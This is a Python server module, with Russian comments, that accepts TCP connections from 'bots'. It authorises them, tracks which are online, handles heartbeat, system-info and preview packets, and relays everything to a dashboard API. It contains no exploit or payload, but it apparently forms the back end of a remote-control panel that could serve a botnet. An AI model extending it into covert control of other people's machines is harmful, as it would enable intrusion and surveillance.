# backend/Core/ClientConnection.py

import json
import asyncio
import socket
from typing import Any, Dict, Optional, Tuple, Union

import backend.LoggerWrapper as logger
from backend.Services import (
    read_packet,
    pack_packet,
    authorize_bot,
    get_full_db,
    sync_bot_data,
    active_clients,
    preview_cache
)
from backend.API import manager
from backend import add_bytes


class BotConnectionHandler:
    """
    Класс для обработки входящих TCP-соединений от ботов и трансляции данных в API.
    
    Схема данных пакета:
    [Header: 6 bytes] + [BotID] + [Module] -> [Payload]
    """

    async def handle_new_connection(
        self, 
        reader: asyncio.StreamReader, 
        writer: asyncio.StreamWriter
    ) -> None:
        """
        Управляет жизненным циклом нового подключения бота.
        
        Аргументы:
            reader: Поток чтения данных из сокета.
            writer: Поток записи данных в сокет.
        """
        bot_identifier: Optional[str] = None
        peer_address: str = writer.get_extra_info("peername")[0]

        if (client_socket := writer.get_extra_info("socket")):
            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

        try:
            authorization_result: Optional[Tuple[str, Any]] = await authorize_bot(reader, peer_address)
            if not authorization_result:
                await self._force_close_connection(writer)
                return

            bot_identifier, _ = authorization_result
            active_clients[bot_identifier] = (reader, writer)
            
            self._synchronize_all_clients()
            logger.Log.info(f"[{self.__class__.__name__}] Bot {bot_identifier} online")

            if (cached_preview := preview_cache.get(bot_identifier)):
                manager.broadcast_packet_sync(cached_preview)

            while True:
                try:
                    raw_data: Tuple[str, str, Union[bytes, str]] = await asyncio.wait_for(
                        read_packet(reader), 
                        timeout=10.0
                    )
                except asyncio.TimeoutError:
                    break

                packet_bot_id, module_name, payload = raw_data
                if not packet_bot_id:
                    break

                payload_length: int = len(payload) if isinstance(payload, bytes) else len(str(payload))
                add_bytes(6 + len(packet_bot_id) + len(module_name) + payload_length)

                if module_name == "Heartbeat" and payload == "ping":
                    writer.write(pack_packet(packet_bot_id, "Heartbeat", "pong"))
                    await writer.drain()

                elif module_name == "SystemInfo":
                    synchronized_data: Dict[str, Any] = sync_bot_data(packet_bot_id, payload)
                    json_payload: str = json.dumps(synchronized_data, ensure_ascii=False)
                    manager.broadcast_packet_sync(
                        pack_packet(packet_bot_id, module_name, json_payload)
                    )

                elif module_name == "Preview":
                    preview_cache[packet_bot_id] = pack_packet(packet_bot_id, module_name, payload)
                    manager.broadcast_packet_sync(preview_cache[packet_bot_id])

                else:
                    manager.broadcast_packet_sync(pack_packet(packet_bot_id, module_name, payload))

        except Exception as error:
            logger.Log.error(f"[{self.__class__.__name__}] Handler Err [{bot_identifier}]: {error}")
        finally:
            await self._disconnect_bot(bot_identifier, writer)

    def _synchronize_all_clients(self) -> None:
        """
        Собирает актуальный список всех ботов из БД и рассылает обновленные статусы через API.
        """
        bot_list: list[Dict[str, Any]] = [
            {
                **data, 
                "id": bot_id, 
                "status": ("online" if bot_id in active_clients else "offline")
            } 
            for bot_id, data in get_full_db().items()
        ]
        
        system_packet: bytes = pack_packet(
            "SERVER", 
            "SystemInfo", 
            json.dumps(bot_list, ensure_ascii=False)
        )
        manager.broadcast_packet_sync(system_packet)

    async def _disconnect_bot(self, bot_id: Optional[str], writer: asyncio.StreamWriter) -> None:
        """
        Удаляет бота из списка активных соединений и обновляет его статус в системе.
        """
        if bot_id and bot_id in active_clients:
            active_clients.pop(bot_id)
            sync_bot_data(bot_id, {"status": "offline"})
            self._synchronize_all_clients()
            logger.Log.warning(f"[{self.__class__.__name__}] Bot {bot_id} disconnected")
        
        await self._force_close_connection(writer)

    async def _force_close_connection(self, writer: asyncio.StreamWriter) -> None:
        """
        Безопасно и принудительно завершает работу сокета.
        """
        try:
            writer.close()
            await asyncio.wait_for(writer.wait_closed(), timeout=1.0)
        except Exception:
            pass